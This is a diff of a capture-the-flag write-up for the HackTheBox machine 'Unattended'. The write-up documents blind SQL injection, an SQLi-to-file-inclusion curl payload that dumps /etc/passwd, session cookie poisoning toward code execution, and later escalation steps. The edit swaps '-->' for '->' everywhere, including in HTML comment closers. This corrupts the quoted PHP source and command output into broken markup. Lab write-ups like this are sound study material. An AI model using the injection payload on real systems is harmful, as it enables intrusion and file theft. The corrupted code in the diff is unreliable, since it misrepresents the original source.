@@ -37,7 +37,7 @@ PORT    STATE SERVICE  VERSION
 
 There's a custom domain to be added to `/etc/hosts`.
 
-### Web Enum --> Blind SQLI
+### Web Enum -> Blind SQLI
 
 Visiting `www.nestedflanders.htb` returns the default Debian page:
 
@@ -64,7 +64,7 @@ Starting gobuster in directory enumeration mode
 /.hta                 (Status: 403) [Size: 276]
 /.htaccess            (Status: 403) [Size: 276]
 /.htpasswd            (Status: 403) [Size: 276]
-/dev                  (Status: 301) [Size: 185] [--> https://www.nestedflanders.htb/dev/]
+/dev                  (Status: 301) [Size: 185] [-> https://www.nestedflanders.htb/dev/]
 /index.html           (Status: 200) [Size: 10701]
 /index.php            (Status: 200) [Size: 1244]
 /server-status        (Status: 200) [Size: 4135]
@@ -127,7 +127,7 @@ config,customers,employees,filepath,idname,offices,orderdetails,orders,payments,
 
 The above took forever to generate, and there were way too many tables for me to enumerate via blind injection.
 
-### Nginx LFI --> Source Code Access
+### Nginx LFI -> Source Code Access
 
 Apart from the SQL database, there was only the `/dev` endpoint. I looked to Hacktricks for `nginx` exploits, since the detailed nmap scan told me this server was running on `nginx`.
 
@@ -242,10 +242,10 @@ if ($result->num_rows > 0) {
 <?php
 include("$inc");
 ?>
-<!-- </div> -->
+<!-- </div> ->
 
-</div> <!-- row -->
-</div> <!-- container -->
+</div> <!-- row ->
+</div> <!-- container ->
 <?php if ($debug) { echo "include $inc;<br>\n"; } ?>
 ```
 
@@ -362,7 +362,7 @@ This works in getting me an LFI:
 ```
 $ curl -k -G --data-urlencode "id=465' AND 1=2 UNION SELECT 'lol\' UNION SELECT \'/etc/passwd\' -- -'-- -" https://www.nestedflanders.htb/index.php
 
-<!-- <div align="center"> -->
+<!-- <div align="center"> ->
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -390,7 +390,7 @@ messagebus:x:105:109::/var/run/dbus:/bin/false
 sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 guly:x:1000:1000:guly,,,:/home/guly:/bin/bash
 mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
-<!-- </div> -->
+<!-- </div> ->
 ```
 
 Now, I need to somehow use this LFI for RCE. There were a few methods on Hacktricks, all of which involved reading the logs in the machine. 
@@ -419,7 +419,7 @@ From here, I could read `/var/log/nginx/access.log`, and technically RCE is poss
 I tried writing some extra cookies by adding `Cookie: PHPSESSID=n2jb3u50gv104k78v768i9h3h0; test=test` as a header, then reading `/var/lib/php/sessions/sess_<COOKIE>`, and it worked:
 
 ```
-PHPSESSID|s:26:"n2jb3u50gv104k78v768i9h3h0";test|s:4:"test";<!-- </div> -->
+PHPSESSID|s:26:"n2jb3u50gv104k78v768i9h3h0";test|s:4:"test";<!-- </div> ->
 ```
 
 Now I can set one of the cookies to be a urlencoded PHP command shell:
@@ -536,7 +536,7 @@ $ python3 full_rce.py
 
 There's a user `guly` on the machine, but I cannot access the flag there yet.
 
-### MySQL Enum --> Overwrite Script Values
+### MySQL Enum -> Overwrite Script Values
 
 I found some MySQL creds earlier, may as well use them:
 
@@ -670,7 +670,7 @@ After a while, I got a reverse shell:
 
 ![](../../../.gitbook/assets/unattended-image-6.png)
 
-### Grub Group --> Root
+### Grub Group -> Root
 
 This user was part of the `grub` group, something that I had not seen before. I searched for all files users of this group had permissions over:
 
